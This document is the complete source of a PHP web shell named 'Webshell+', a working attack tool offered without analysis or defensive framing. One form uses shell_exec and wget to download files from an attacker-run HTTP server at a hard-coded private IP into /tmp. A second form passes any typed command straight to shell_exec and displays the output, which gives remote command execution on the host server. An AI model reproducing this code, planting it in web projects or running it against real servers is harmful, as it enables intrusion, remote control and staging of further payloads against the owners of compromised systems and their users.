<!DOCTYPE html>
<html>
<head>
    <title>Webshell+</title>
</head>

    <body>

        <form action="shellplus.php" method="post">
            File Upload: <input type="file" name="fileUpload" id="fileUpload">
            <input type="submit" Value="Upload" name="Upload File Now">
        </form>
        <?php
        /*  
            File Upload

            For this to work, run Python server in directory with files to upload. 
            
            Python2 "python -m SimpleHTTPServer 8000"
            Python3 "python3 -m http.server 8000"

        */
        $ipPort = "http://192.168.1.2:8000/";// Change IP and Port
        $file = ($_POST["fileUpload"]);
        $upload = shell_exec('wget -O /tmp/' . $file . ' ' . $ipPort . $file);
        echo "<pre>$upload</pre>"; 
        ?>

        <br>
        <br>
        <br>

        <form action="shellplus.php" method="post">
            Command: <input type="hidden" name="pwd" value="pwd &&"> 
            <input type="text" name="cmd">
            <input type="submit" value="Submit">
        </form>

        <?php
        /*
            Web Shell Command Line
        */ 
        $pwd = ($_POST["pwd"]);
        $command = ($_POST["cmd"]);
        $displayError = "2>&1";
        $output = shell_exec($pwd . ' ' . $command . ' ' . $displayError);
        ?>

        <br>
        <br>
            
            <font size="5" face="Consolas" >
            <table align="center" width="1600" border="1">
                <tr>
                    <td>
                        <?php echo "<pre>$output</pre>"; ?>
                    </td>
                </tr>
            </table>
        <br>
        
    </body>
</html>